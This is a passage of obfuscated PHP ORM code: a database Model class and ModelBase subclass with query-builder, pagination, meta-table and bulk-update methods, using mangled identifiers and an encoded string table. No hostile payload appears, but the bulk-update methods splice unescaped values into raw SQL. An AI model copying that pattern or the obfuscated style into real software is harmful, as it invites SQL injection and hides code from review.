$€Ğêì‹İ[10] : $€Ğêì‹İ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Ü‹¸–ë– =& $_SERVER[ò«¥Ê‡å]; return isset($this->fields[$Ü‹¸–ë–[297]]) ? $this->fields[$Ü‹¸–ë–[297]] : $this->pk; } public function getDbFields() { $àÂ–×³Ş =& $_SERVER[ò«¥Ê‡å]; if (isset($this->options[$àÂ–×³Ş[325]])) { $§‚½™êï = $this->db->getFields($this->options[$àÂ–×³Ş[325]]); return $§‚½™êï ? array_keys($§‚½™êï) : !1; } if ($this->fields) { $§‚½™êï = $this->fields; unset($§‚½™êï[$àÂ–×³Ş[296]], $§‚½™êï[$àÂ–×³Ş[297]], $§‚½™êï[$àÂ–×³Ş[298]], $§‚½™êï[$àÂ–×³Ş[295]]); return $§‚½™êï; } return !1; } public function data($üéŞÊà = '') { $Ù£šî‹Ñ =& $_SERVER[ò«¥Ê‡å]; if ($Ù£šî‹Ñ[12] === $üéŞÊà && !empty($this->data)) { return $this->data; } if (is_object($üéŞÊà)) { $üéŞÊà = get_object_vars($üéŞÊà); } elseif (is_string($üéŞÊà)) { parse_str($üéŞÊà, $üéŞÊà); } elseif (!is_array($üéŞÊà)) { think_exception(think_lang($Ù£šî‹Ñ[317])); } $this->data = $üéŞÊà; return $this; } public function join($ÆÉ”·ŸŒ) { $”¡­İ¡æ =& $_SERVER[ò«¥Ê‡å]; if (is_array($ÆÉ”·ŸŒ)) { $this->options[$”¡­İ¡æ[328]] = $ÆÉ”·ŸŒ; } elseif (!empty($ÆÉ”·ŸŒ)) { $this->options[$”¡­İ¡æ[328]][] = $ÆÉ”·ŸŒ; } return $this; } public function union($–Õï“à, $¾¾§€äÏ = false) { $Ùí¦Ã ¨ =& $_SERVER[ò«¥Ê‡å]; if (empty($–Õï“à)) { return $this; } if ($¾¾§€äÏ) { $this->options[$Ùí¦Ã ¨[393]][$Ùí¦Ã ¨[394]] = !0; } if (is_object($–Õï“à)) { $–Õï“à = get_object_vars($–Õï“à); } if (is_string($–Õï“à)) { $û”öùó = $–Õï“à; } elseif (is_array($–Õï“à)) { if (isset($–Õï“à[0])) { $this->options[$Ùí¦Ã ¨[393]] = array_merge($this->options[$Ùí¦Ã ¨[393]], $–Õï“à); return $this; } else { $û”öùó = $–Õï“à; } } else { think_exception(think_lang($Ùí¦Ã ¨[317])); } $this->options[$Ùí¦Ã ¨[393]][] = $û”öùó; return $this; } public function cache($á‚•Àæ„ = true, $¤é¶š· = null, $Ïü‚ØØ« = '') { $†ùº•í´ =& $_SERVER[ò«¥Ê‡å]; if (!1 !== $á‚•Àæ„) { $this->options[$†ùº•í´[395]] = array($†ùº•í´[96] => $á‚•Àæ„, $†ùº•í´[385] => $¤é¶š·, $†ùº•í´[33] => $Ïü‚ØØ«); } return $this; } public function field($Îœµïşº, $·õü‰Ñè = false) { $àåØ®Ó =& $_SERVER[ò«¥Ê‡å]; if (!0 === $Îœµïşº) { $•Œ²ÇÑ· = $this->getDbFields(); $Îœµïşº = $•Œ²ÇÑ· ? $•Œ²ÇÑ· : $àåØ®Ó[205]; } elseif ($·õü‰Ñè) { if (is_string($Îœµïşº)) { $Îœµïşº = explode($àåØ®Ó[50], $Îœµïşº); } $•Œ²ÇÑ· = $this->getDbFields(); $Îœµïşº = $•Œ²ÇÑ· ? array_diff($•Œ²ÇÑ·, $Îœµïşº) : $Îœµïşº; } $this->options[$àåØ®Ó[319]] = $Îœµïşº; return $this; } public function scope($á··÷¡ˆ = '', $áØòû£¸ = NULL) { $Ó®¢ãûã =& $_SERVER[ò«¥Ê‡å]; if ($Ó®¢ãûã[12] === $á··÷¡ˆ) { if (isset($this->_scope[$Ó®¢ãûã[37]])) { $¼Ù‚İ”ì = $this->_scope[$Ó®¢ãûã[37]]; } else { return $this; } } elseif (is_string($á··÷¡ˆ)) { $¢ ú©µ = explode($Ó®¢ãûã[50], $á··÷¡ˆ); $¼Ù‚İ”ì = array(); foreach ($¢ ú©µ as $«ıÀİŞÀ) { if (!isset($this->_scope[$«ıÀİŞÀ])) { continue; } $¼Ù‚İ”ì = array_merge($¼Ù‚İ”ì, $this->_scope[$«ıÀİŞÀ]); } if (!empty($áØòû£¸) && is_array($áØòû£¸)) { $¼Ù‚İ”ì = array_merge($¼Ù‚İ”ì, $áØòû£¸); } } elseif (is_array($á··÷¡ˆ)) { $¼Ù‚İ”ì = $á··÷¡ˆ; } if (is_array($¼Ù‚İ”ì) && !empty($¼Ù‚İ”ì)) { $this->options = array_merge($this->options, array_change_key_case($¼Ù‚İ”ì)); } return $this; } public function where($Ã›‹°«•, $¤§…‘›¬ = null) { $òÔè¯…Ô =& $_SERVER[ò«¥Ê‡å]; if (!is_null($¤§…‘›¬) && is_string($Ã›‹°«•)) { if (!is_array($¤§…‘›¬)) { $¤§…‘›¬ = func_get_args(); array_shift($¤§…‘›¬); } $¤§…‘›¬ = array_map(array($this->db, $òÔè¯…Ô[389]), $¤§…‘›¬); $Ã›‹°«• = vsprintf($Ã›‹°«•, $¤§…‘›¬); } elseif (is_object($Ã›‹°«•)) { $Ã›‹°«• = get_object_vars($Ã›‹°«•); } elseif (is_array($Ã›‹°«•)) { foreach ($Ã›‹°«• as $©“ûñíï => $èèäßü³) { if ((is_numeric($©“ûñíï) || !$©“ûñíï) && is_string($èèäßü³)) { if (strpos($èèäßü³, $òÔè¯…Ô[396]) === 0) { continue; } think_trace($òÔè¯…Ô[397], $òÔè¯…Ô[12], $òÔè¯…Ô[49]); die; } } } if (is_string($Ã›‹°«•) && $òÔè¯…Ô[12] != $Ã›‹°«•) { $‘·ÊÏğ = array(); $‘·ÊÏğ[$òÔè¯…Ô[398]] = $Ã›‹°«•; $Ã›‹°«• = $‘·ÊÏğ; } if (isset($this->options[$òÔè¯…Ô[321]])) { $this->options[$òÔè¯…Ô[321]] = array_merge($this->options[$òÔè¯…Ô[321]], $Ã›‹°«•); } else { $this->options[$òÔè¯…Ô[321]] = $Ã›‹°«•; } return $this; } public function limit($©­”Ò¹Ç, $£»î•ü = null) { $ø—ú»À½ =& $_SERVER[ò«¥Ê‡å]; $this->options[$ø—ú»À½[338]] = is_null($£»î•ü) ? $©­”Ò¹Ç : $©­”Ò¹Ç . $ø—ú»À½[50] . $£»î•ü; return $this; } public function page($¤ÒÒÛ™ó, $ùÌÉä¹ = null) { $ÆŒÜ°èö =& $_SERVER[ò«¥Ê‡å]; $this->options[$ÆŒÜ°èö[399]] = is_null($ùÌÉä¹) ? $¤ÒÒÛ™ó : $¤ÒÒÛ™ó . $ÆŒÜ°èö[50] . $ùÌÉä¹; return $this; } public function comment($õ‹¥ŠòÜ) { $this->options[$_SERVER[ò«¥Ê‡å][400]] = $õ‹¥ŠòÜ; return $this; } public function setProperty($öÑúÖÖ¤, $ÑÚÖŠ€´) { if (property_exists($this, $öÑúÖÖ¤)) { $this->{$öÑúÖÖ¤} = $ÑÚÖŠ€´; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\x69\x66\x79\x54\x69\155\x65", "\164\151\x6d\145", "\x69\x6e\x73\145\162\164\54\x75\160\x64\x61\x74\145", "\146\165\x6e\x63\164\151\157\x6e"), array("\143\162\x65\x61\164\x65\x54\x69\x6d\145", "\x74\x69\x6d\x65", "\151\156\x73\x65\162\x74", "\x66\x75\x6e\143\164\x69\157\156")); public function setDataAuto($ó­ı¸”ê) { $this->dataAuto = $ó­ı¸”ê; } public function __construct($¨ÄÊñÁÂ = '', $–Ğ¼ĞïÊ = '', $ı¥¶Çè = '') { parent::__construct($¨ÄÊñÁÂ, $–Ğ¼ĞïÊ, $ı¥¶Çè); } protected $tableMeta = array(); protected function _beforeInsert(&$Üé³®×Û, $ó¡¶™Ÿ—) { $œò©óË„ =& $_SERVER[ò«¥Ê‡å]; if (!$this->checkDataAutoHas($œò©óË„[401])) { return; } $this->dataBeforeFilter($Üé³®×Û, $œò©óË„[401]); } protected function _beforeUpdate(&$µõö›®¯, $ÃØëûÂ) { $Šß¾ÁÈ =& $_SERVER[ò«¥Ê‡å]; if (!$this->checkDataAutoHas($Šß¾ÁÈ[402])) { return; } $this->dataBeforeFilter($µõö›®¯, $Šß¾ÁÈ[402]); } protected function _afterSelect(&$şÚÅ¸±ï, $çÁ·î‡µ) { if (!is_array($şÚÅ¸±ï)) { return; } if (!$this->checkDataAutoHas($_SERVER[ò«¥Ê‡å][403])) { return; } foreach ($şÚÅ¸±ï as &$›¸¢Ëä) { $this->dataAfterFilter($›¸¢Ëä); } unset($›¸¢Ëä); } protected function _afterFind(&$Î‚£¶áŞ, $ÍÔ¹ûá) { if (!is_array($Î‚£¶áŞ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ò«¥Ê‡å][403])) { return; } $this->dataAfterFilter($Î‚£¶áŞ); } public static function textEncode($¿ÙÙÄªÜ) { if (!$¿ÙÙÄªÜ) { return $¿ÙÙÄªÜ; } $¨‘ÊŠÛş = json_encode($¿ÙÙÄªÜ); $¨‘ÊŠÛş = preg_replace_callback($_SERVER[ò«¥Ê‡å][404], function ($‰³†ğµÃ) { return addslashes($‰³†ğµÃ[0]); }, $¨‘ÊŠÛş); return json_decode($¨‘ÊŠÛş); } public static function textDecode($¹›…›‹¸) { $óã°ûäÄ =& $_SERVER[ò«¥Ê‡å]; $®Ô½¶ìı = json_encode($¹›…›‹¸); $®Ô½¶ìı = preg_replace_callback($óã°ûäÄ[405], function ($¤„¡ıæÕ) { return $_SERVER[ò«¥Ê‡å][99]; }, $®Ô½¶ìı); return json_decode($®Ô½¶ìı); } public function setAutoIncrement($ÄÁ§¾ú’) { $·ıÀîâµ = array($this->getPk() => $ÄÁ§¾ú’); $ÚÀŒåºÛ = $this->data($·ıÀîâµ)->add(); if ($ÚÀŒåºÛ) { $this->delete($ÚÀŒåºÛ); } } public function getAutoIncrement() { $Èªªúêü = $this->getTableName(); $ËÑ—‚´ˆ = $this->max($this->getPk()); $÷’ÜÎ¿¿ = $this->query("\x73\150\x6f\167\40\x74\x61\x62\x6c\x65\x20\163\164\x61\x74\165\x73\x20\167\x68\145\162\x65\40\x4e\x61\155\145\75\x27{$Èªªúêü}\47"); $ğ³Şêå¢ = $÷’ÜÎ¿¿[0][$_SERVER[ò«¥Ê‡å][406]]; $ÛóÁàâÚ = max($ËÑ—‚´ˆ, $ğ³Şêå¢); return $ÛóÁàâÚ; } protected function _callBefore($‘ÜæÂÕ‡, $ÊÍÏ™«é) { return $this->cacheCallCheck($‘ÜæÂÕ‡, $ÊÍÏ™«é, !1); } protected function _callAfter($¨Úáßäé, $¦îæƒÑü) { return $this->cacheCallCheck($¨Úáßäé, $¦îæƒÑü, !0); } protected function cacheFunctionAlias($úÀ‰†ãƒ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($¢³‡›¿Í, $§Ë’´¥ß, $¤øó“Ş = false) { $›†Ó×ÏÃ = $this->cacheFunctionAlias($§Ë’´¥ß); if (!$›†Ó×ÏÃ) { return; } foreach ($›†Ó×ÏÃ as $åŠ’µİÉ => $òÅŸ‚ß) { $ßÙïø½ç = $òÅŸ‚ß[0]; $Ÿ‡Ãœâ° = explode($_SERVER[ò«¥Ê‡å][50], $òÅŸ‚ß[1]); if ($¢³‡›¿Í == $åŠ’µİÉ) { return $this->cacheFunctionGet($åŠ’µİÉ, $ßÙïø½ç); } if ($¤øó“Ş && in_array($¢³‡›¿Í, $Ÿ‡Ãœâ°)) { $this->cacheFunctionClear($åŠ’µİÉ, $ßÙïø½ç); } } } public function cacheFunctionGet($ù­í­®Í, $›ø¯À) { $ê—ÏÉäĞ = $this->cacheKeyMake($ù­í­®Í, $›ø¯À); $Üü‡¢¦û = Cache::get($ê—ÏÉäĞ); if (!is_array($Üü‡¢¦û)) { $Üü‡¢¦û = call_user_func_array(array($this, $ù­í­®Í), array($›ø¯À, !0)); Cache::set($ê—ÏÉäĞ, $Üü‡¢¦û); } return $Üü‡¢¦û; } public function cacheFunctionClear($ãşõ˜², $¨±Ğ»¤) { $²·Çâ = $¨±Ğ»¤; if (!is_array($¨±Ğ»¤)) { $²·Çâ = array($¨±Ğ»¤); } foreach ($²·Çâ as $öÀÇÓè) { $¿šÕŸ†® = $this->cacheKeyMake($ãşõ˜², $öÀÇÓè); Cache::remove($¿šÕŸ†®); } } private function cacheKeyMake($øâĞÁÙ, $îÃ“Ç…°) { $ÎšÖÃÅ =& $_SERVER[ò«¥Ê‡å]; return get_class($this) . $ÎšÖÃÅ[11] . $øâĞÁÙ . $ÎšÖÃÅ[407] . $îÃ“Ç…°; } protected function selectPageReset() { $êë¯îîÈ =& $_SERVER[ò«¥Ê‡å]; if (isset($GLOBALS[$êë¯îîÈ[408]])) { return; } $GLOBALS[$êë¯îîÈ[408]] = isset($GLOBALS[$êë¯îîÈ[7]][$êë¯îîÈ[409]]) ? $GLOBALS[$êë¯îîÈ[7]][$êë¯îîÈ[409]] : !1; $GLOBALS[$êë¯îîÈ[410]] = isset($GLOBALS[$êë¯îîÈ[7]][$êë¯îîÈ[399]]) ? $GLOBALS[$êë¯îîÈ[7]][$êë¯îîÈ[399]] : !1; $GLOBALS[$êë¯îîÈ[7]][$êë¯îîÈ[409]] = !1; $GLOBALS[$êë¯îîÈ[7]][$êë¯îîÈ[399]] = !1; } protected function selectPageRestore() { $ÓíÍ×Ü¨ =& $_SERVER[ò«¥Ê‡å]; if (!isset($GLOBALS[$ÓíÍ×Ü¨[408]])) { return; } $GLOBALS[$ÓíÍ×Ü¨[7]][$ÓíÍ×Ü¨[409]] = $GLOBALS[$ÓíÍ×Ü¨[408]]; $GLOBALS[$ÓíÍ×Ü¨[7]][$ÓíÍ×Ü¨[399]] = $GLOBALS[$ÓíÍ×Ü¨[410]]; if ($GLOBALS[$ÓíÍ×Ü¨[7]][$ÓíÍ×Ü¨[409]] === !1) { unset($GLOBALS[$ÓíÍ×Ü¨[7]][$ÓíÍ×Ü¨[409]]); } if ($GLOBALS[$ÓíÍ×Ü¨[7]][$ÓíÍ×Ü¨[399]] === !1) { unset($GLOBALS[$ÓíÍ×Ü¨[7]][$ÓíÍ×Ü¨[399]]); } unset($GLOBALS[$ÓíÍ×Ü¨[408]]); unset($GLOBALS[$ÓíÍ×Ü¨[410]]); } protected function selectPage($¢í¥°©‹ = 200, $Íğşì¨ô = 1) { $ıØÉÁ–ß =& $_SERVER[ò«¥Ê‡å]; global $in; $ıİóƒ›¬ = $this->optionsValue(); $Ûİ®ÑóÓ = 50000; $¢í¥°©‹ = isset($in[$ıØÉÁ–ß[409]]) && $in[$ıØÉÁ–ß[409]] ? $in[$ıØÉÁ–ß[409]] : $¢í¥°©‹; if ($¢í¥°©‹ === -1) { $in[$ıØÉÁ–ß[409]] = !1; $Ûİ®ÑóÓ = 100000000; $¢í¥°©‹ = $Ûİ®ÑóÓ; } $ıç¨ûæó = $ıİóƒ›¬; $ıç¨ûæó[$ıØÉÁ–ß[411]] = array(); $¢í¥°©‹ = intval($¢í¥°©‹); $¢í¥°©‹ = $¢í¥°©‹ <= 5 ? 5 : ($¢í¥°©‹ >= $Ûİ®ÑóÓ ? $Ûİ®ÑóÓ : $¢í¥°©‹); $Íğşì¨ô = intval(isset($in[$ıØÉÁ–ß[399]]) && $in[$ıØÉÁ–ß[399]] ? $in[$ıØÉÁ–ß[399]] : $Íğşì¨ô); $Íğşì¨ô = $Íğşì¨ô <= 1 ? 1 : $Íğşì¨ô; $©ß•²î = array(); $–ëÛ½ğÒ = 1; if ($Íğşì¨ô == 1 && $–ëÛ½ğÒ) { $this->optionsValue($ıİóƒ›¬); $©ß•²î = $this->page($Íğşì¨ô, $¢í¥°©‹)->select(); $òÅµŸ¶¼ = is_array($©ß•²î) ? count($©ß•²î) : 0; if ($òÅµŸ¶¼ < $¢í¥°©‹) { $’´Éùº = 1; } else { $this->optionsValue($ıç¨ûæó); $òÅµŸ¶¼ = intval($this->count()); $’´Éùº = ceil($òÅµŸ¶¼ / $¢í¥°©‹); } } else { $this->optionsValue($ıç¨ûæó); $òÅµŸ¶¼ = intval($this->count()); $’´Éùº = ceil($òÅµŸ¶¼ / $¢í¥°©‹); $Íğşì¨ô = $Íğşì¨ô >= $’´Éùº ? $’´Éùº : $Íğşì¨ô; $this->optionsValue($ıİóƒ›¬); $©ß•²î = $this->page($Íğşì¨ô, $¢í¥°©‹)->select(); } if (!is_array($©ß•²î)) { $©ß•²î = array(); } if ($’´Éùº == 1) { $òÅµŸ¶¼ = count($©ß•²î); } $…­–„æ = array($ıØÉÁ–ß[412] => array($ıØÉÁ–ß[413] => $òÅµŸ¶¼, $ıØÉÁ–ß[409] => $¢í¥°©‹, $ıØÉÁ–ß[399] => $Íğşì¨ô, $ıØÉÁ–ß[414] => $’´Éùº), $ıØÉÁ–ß[415] => $©ß•²î); return $…­–„æ; } protected function checkLength($¸š¾‘Œ†, $‡†‰Ê™ = 0, $‰şÅ¬¢É = '') { $Îí‹ƒŠû =& $_SERVER[ò«¥Ê‡å]; $‡†‰Ê™ = $‡†‰Ê™ ? $‡†‰Ê™ : 65536; if (!$¸š¾‘Œ† || strlen($¸š¾‘Œ†) < $‡†‰Ê™) { return; } $‰şÅ¬¢É = $‰şÅ¬¢É ? $‰şÅ¬¢É . $Îí‹ƒŠû[73] : $Îí‹ƒŠû[12]; show_json($‰şÅ¬¢É . LNG($Îí‹ƒŠû[416]) . "\x28{$‡†‰Ê™}\51", !1); } protected function metaSet($“ˆùÙ•í, $Áƒº›À™ = null, $Üœü›Öü = null) { $¥é™ñÉ“ =& $_SERVER[ò«¥Ê‡å]; if (!$this->tableMeta || !$“ˆùÙ•í) { return !1; } $Ûû­ş³Ç = $this->tableMeta[$¥é™ñÉ“[417]]; $¬şİ ™ = $this->tableMeta[$¥é™ñÉ“[418]]; $ ‰×÷Ë² = Model($¬şİ ™); $’ŠÈÍ† = array($Ûû­ş³Ç => $“ˆùÙ•í, $¥é™ñÉ“[419] => $Áƒº›À™); if (is_null($Áƒº›À™)) { return $ ‰×÷Ë²->where(array($Ûû­ş³Ç => $“ˆùÙ•í))->delete(); } if (is_null($Üœü›Öü) && is_string($Áƒº›À™)) { return $ ‰×÷Ë²->where($’ŠÈÍ†)->delete(); } $ı®‘‘‰¨ = is_array($Áƒº›À™) ? $Áƒº›À™ : array(); if (is_string($Áƒº›À™)) { $ı®‘‘‰¨[$Áƒº›À™] = $Üœü›Öü; } $°Ê¨û”Í = array(); foreach ($ı®‘‘‰¨ as $êÍáëŒ· => $û¤–ÄŒ°) { if (is_null($û¤–ÄŒ°) && is_string($êÍáëŒ·)) { $ ‰×÷Ë²->where(array($Ûû­ş³Ç => $“ˆùÙ•í, $¥é™ñÉ“[419] => $êÍáëŒ·))->delete(); continue; } $this->checkLength($û¤–ÄŒ°, !1, $¬şİ ™ . $¥é™ñÉ“[4] . $êÍáëŒ·); $°Ê¨û”Í[] = array($Ûû­ş³Ç => $“ˆùÙ•í, $¥é™ñÉ“[96] => $êÍáëŒ·, $¥é™ñÉ“[420] => $û¤–ÄŒ°); } $¶šÖí‡ß = $¥é™ñÉ“[421] . $¬şİ ™; CacheLock::lock($¶šÖí‡ß); $ ‰×÷Ë²->where(array($Ûû­ş³Ç => $“ˆùÙ•í))->addAll($°Ê¨û”Í, array(), !0); CacheLock::unlock($¶šÖí‡ß); return !0; } public function metaGet($¥‘ŞÕ‡, $ Ø£îé¨ = false) { $î™ÚÔû =& $_SERVER[ò«¥Ê‡å]; if (!$this->tableMeta) { return array(); } $ÄôÊ¹óÖ = $this->tableMeta[$î™ÚÔû[417]]; $µ®©³ßĞ = Model($this->tableMeta[$î™ÚÔû[418]]); if ($ Ø£îé¨) { $Ì·«½¤ = array($ÄôÊ¹óÖ => $¥‘ŞÕ‡, $î™ÚÔû[96] => $ Ø£îé¨); return $µ®©³ßĞ->where($Ì·«½¤)->getField($î™ÚÔû[420]); } $Ì·«½¤ = array($ÄôÊ¹óÖ => $¥‘ŞÕ‡); $ŞÔş¥ = $µ®©³ßĞ->field($î™ÚÔû[422])->where($Ì·«½¤)->select(); $ŞÔş¥ = array_to_keyvalue($ŞÔş¥, $î™ÚÔû[96], $î™ÚÔû[420]); return $ŞÔş¥; } private function checkDataAutoHas($Œ­ÂÎÜâ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ü‡ŒæÁ¼) { if (in_array($Œ­ÂÎÜâ, explode($_SERVER[ò«¥Ê‡å][50], $ü‡ŒæÁ¼[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$×å¦ô»ê, $œˆïÏÂ) { $¤ôôŠ˜ =& $_SERVER[ò«¥Ê‡å]; if (!is_array($×å¦ô»ê)) { return; } foreach ($this->dataAuto as $Ù¤åÀ) { $“ë‡–¦æ = $Ù¤åÀ[0]; if (!in_array($œˆïÏÂ, explode($¤ôôŠ˜[50], $Ù¤åÀ[2]))) { continue; } switch (trim($Ù¤åÀ[3])) { case $¤ôôŠ˜[367]: case $¤ôôŠ˜[368]: $•­»µÈä = $Ù¤åÀ[1]; $ì¹„Çîë = isset($Ù¤åÀ[4]) ? (array) $Ù¤åÀ[4] : array(); if ($•­»µÈä == $¤ôôŠ˜[196] && array_key_exists($“ë‡–¦æ, $×å¦ô»ê)) { if (!$×å¦ô»ê[$“ë‡–¦æ]) { unset($×å¦ô»ê[$“ë‡–¦æ]); } break; } if (isset($×å¦ô»ê[$“ë‡–¦æ])) { array_unshift($ì¹„Çîë, $×å¦ô»ê[$“ë‡–¦æ]); } if ($¤ôôŠ˜[367] == $Ù¤åÀ[3]) { $×å¦ô»ê[$“ë‡–¦æ] = call_user_func_array($•­»µÈä, $ì¹„Çîë); } else { $×å¦ô»ê[$“ë‡–¦æ] = call_user_func_array(array(&$this, $•­»µÈä), $ì¹„Çîë); } break; case $¤ôôŠ˜[316]: if (isset($×å¦ô»ê[$“ë‡–¦æ]) && $×å¦ô»ê[$“ë‡–¦æ]) { $×å¦ô»ê[$“ë‡–¦æ] = call_user_func_array(array(&$this, $Ù¤åÀ[1]), array($×å¦ô»ê[$“ë‡–¦æ])); } break; case $¤ôôŠ˜[319]: $×å¦ô»ê[$“ë‡–¦æ] = $×å¦ô»ê[$Ù¤åÀ[1]]; break; case $¤ôôŠ˜[340]: if (isset($×å¦ô»ê[$“ë‡–¦æ]) && !is_string($×å¦ô»ê[$“ë‡–¦æ])) { $×å¦ô»ê[$“ë‡–¦æ] = json_encode_force($×å¦ô»ê[$“ë‡–¦æ]); } break; case $¤ôôŠ˜[369]: if ($×å¦ô»ê[$“ë‡–¦æ] === $¤ôôŠ˜[12]) { unset($×å¦ô»ê[$“ë‡–¦æ]); } break; case $¤ôôŠ˜[370]: $×å¦ô»ê[$“ë‡–¦æ] = $Ù¤åÀ[1]; default: break; } } if ($œˆïÏÂ == $¤ôôŠ˜[401]) { $ßÓ—‚§— = strtolower($this->db->getDbType()); if (strpos($ßÓ—‚§—, $¤ôôŠ˜[13]) !== 0) { return; } $ª³¥Ûƒ = $this->field(!0)->fields; $­ïƒ–“ó = $ª³¥Ûƒ[$¤ôôŠ˜[298]]; if (isset($ª³¥Ûƒ[$¤ôôŠ˜[297]])) { unset($­ïƒ–“ó[$ª³¥Ûƒ[$¤ôôŠ˜[297]]]); } foreach ($­ïƒ–“ó as $ğÍ÷±òĞ => $œˆïÏÂ) { if (!isset($×å¦ô»ê[$ğÍ÷±òĞ])) { $×å¦ô»ê[$ğÍ÷±òĞ] = $¤ôôŠ˜[12]; } } } } private function dataAfterFilter(&$üÊ­÷¸¸) { $ÖõòğÙÓ =& $_SERVER[ò«¥Ê‡å]; foreach ($this->dataAuto as $ê‡Ú¸âÄ) { $®‹’ˆí = $ê‡Ú¸âÄ[0]; if (!isset($üÊ­÷¸¸[$®‹’ˆí])) { continue; } if (!in_array($ÖõòğÙÓ[403], explode($ÖõòğÙÓ[50], $ê‡Ú¸âÄ[2]))) { continue; } switch (trim($ê‡Ú¸âÄ[3])) { case $ÖõòğÙÓ[367]: case $ÖõòğÙÓ[368]: $¸ÊšÇÅ = isset($ê‡Ú¸âÄ[4]) ? (array) $ê‡Ú¸âÄ[4] : array(); array_unshift($¸ÊšÇÅ, $üÊ­÷¸¸[$®‹’ˆí]); if (isset($ê‡Ú¸âÄ[4]) && $ê‡Ú¸âÄ[4] == $ÖõòğÙÓ[423]) { $¸ÊšÇÅ = array($üÊ­÷¸¸[$®‹’ˆí]); } if ($ÖõòğÙÓ[367] == $ê‡Ú¸âÄ[3]) { $üÊ­÷¸¸[$®‹’ˆí] = call_user_func_array($ê‡Ú¸âÄ[1], $¸ÊšÇÅ); } else { $üÊ­÷¸¸[$®‹’ˆí] = call_user_func_array(array(&$this, $ê‡Ú¸âÄ[1]), $¸ÊšÇÅ); } break; case $ÖõòğÙÓ[316]: if (isset($üÊ­÷¸¸[$®‹’ˆí]) && $üÊ­÷¸¸[$®‹’ˆí]) { $üÊ­÷¸¸[$®‹’ˆí] = call_user_func_array(array(&$this, $ê‡Ú¸âÄ[1]), array($üÊ­÷¸¸[$®‹’ˆí])); } break; case $ÖõòğÙÓ[319]: $üÊ­÷¸¸[$®‹’ˆí] = $üÊ­÷¸¸[$ê‡Ú¸âÄ[1]]; break; case $ÖõòğÙÓ[340]: $Áàû‘™¶ = $üÊ­÷¸¸[$®‹’ˆí]; $üÊ­÷¸¸[$®‹’ˆí] = json_decode($Áàû‘™¶, !0); if (is_null($üÊ­÷¸¸[$®‹’ˆí])) { $üÊ­÷¸¸[$®‹’ˆí] = $Áàû‘™¶; } break; case $ÖõòğÙÓ[369]: if ($üÊ­÷¸¸[$®‹’ˆí] === $ÖõòğÙÓ[12]) { unset($üÊ­÷¸¸[$®‹’ˆí]); } break; case $ÖõòğÙÓ[370]: $üÊ­÷¸¸[$®‹’ˆí] = $ê‡Ú¸âÄ[1]; break; default: break; } } } public function saveAll($ÏÕÅäœ˜) { $Ì›¯ …¸ =& $_SERVER[ò«¥Ê‡å]; $Šçì”‘… = $this->tablePrefix . $this->tableName; $ö‡ÆœÄ = self::SQL_WHERE_IN_CHUNK; $ÏÕÅäœ˜ = is_array($ÏÕÅäœ˜) ? $ÏÕÅäœ˜ : array(); $µğ‰²ÀŞ = $Ì›¯ …¸[424]; $¸¢íÉ¨ = 0; $¸šÄ¹©Æ = array(); $íüñÍí« = count($ÏÕÅäœ˜); for ($Ú’Œ¦Ø» = 0; $Ú’Œ¦Ø» < $íüñÍí«; $Ú’Œ¦Ø»++) { $ÉõÙæÍ¨ = $ÏÕÅäœ˜[$Ú’Œ¦Ø»]; if (!is_array($ÉõÙæÍ¨) || count($ÉõÙæÍ¨) != 4) { continue; } $©Íš²‘¾ = "\125\120\x44\x41\x54\x45\40\x60{$Šçì”‘…}\x60\x20\x53\x45\124\x20{$ÉõÙæÍ¨[2]}\40\75\40\x43\101\123\105\x20{$ÉõÙæÍ¨[0]}\x20\12"; if ($¸¢íÉ¨ == 0) { $µğ‰²ÀŞ = $©Íš²‘¾; } $¸šÄ¹©Æ[] = $Ì›¯ …¸[120] . $ÉõÙæÍ¨[1] . $Ì›¯ …¸[120]; $¸¢íÉ¨++; $µğ‰²ÀŞ .= "\x20\x57\110\x45\x4e\x20\x27{$ÉõÙæÍ¨[1]}\47\40\124\110\105\x4e\x20\47{$ÉõÙæÍ¨[3]}\47\40\12"; if ($¸¢íÉ¨ == $ö‡ÆœÄ || $Ú’Œ¦Ø» == $íüñÍí« - 1) { $´ä“­ = implode($Ì›¯ …¸[50], $¸šÄ¹©Æ); $µğ‰²ÀŞ .= "\x20\x45\116\104\40\40\x57\x48\105\122\105\40{$ÉõÙæÍ¨[0]}\40\x49\116\40\50{$´ä“­}\51\40"; $this->execute($µğ‰²ÀŞ); $¸¢íÉ¨ = 0; $µğ‰²ÀŞ = $©Íš²‘¾; $this->chunkEventCheck(count($¸šÄ¹©Æ)); $¸šÄ¹©Æ = array(); } } $this->chunkEventSet(); } public function saveAllEach($‚öîâì„) { $÷–áã“ =& $_SERVER[ò«¥Ê‡å]; $¹ïØØ³Û = $this->tablePrefix . $this->tableName; foreach ($‚öîâì„ as $ÌûÀóï‰) { if (!is_array($ÌûÀóï‰) || count($ÌûÀóï‰) != 4) { continue; } $½Ï‰€® = $ÌûÀóï‰[0] . $÷–áã“[425] . $ÌûÀóï‰[1] . $÷–áã“[120]; $Ší»Í¸™ = $ÌûÀóï‰[2] . $÷–áã“[425] . $ÌûÀóï‰[3] . $÷–áã“[120]; $›æäù¾ì = "\165\160\144\x61\164\x65\x20{$¹ïØØ³Û}\x20\x73\x65\164\x20{$Ší»Í¸™}\40\x77\x68\145\x72\145\x20{$½Ï‰€®}\x3b"; $this->execute($›æäù¾ì); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($¥×Ü”ş™ = false, $È²í½é¿ = false) { $this->_chunkEvent = $¥×Ü”ş™; $this->_chunkEventParam = $È²í½é¿; } private function chunkEventCheck($¢ŞÕÚé„) { if (!$this->_chunkEvent) { return; } $×¾®Å = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $×¾®Å[$_SERVER[ò«¥Ê‡å][426]] = $¢ŞÕÚé„; Hook::trigger($this->_chunkEvent, $×¾®Å); } public function addAll($æğÈè•ü, $Ä¸½íê± = array(), $ßĞè¬Éõ = 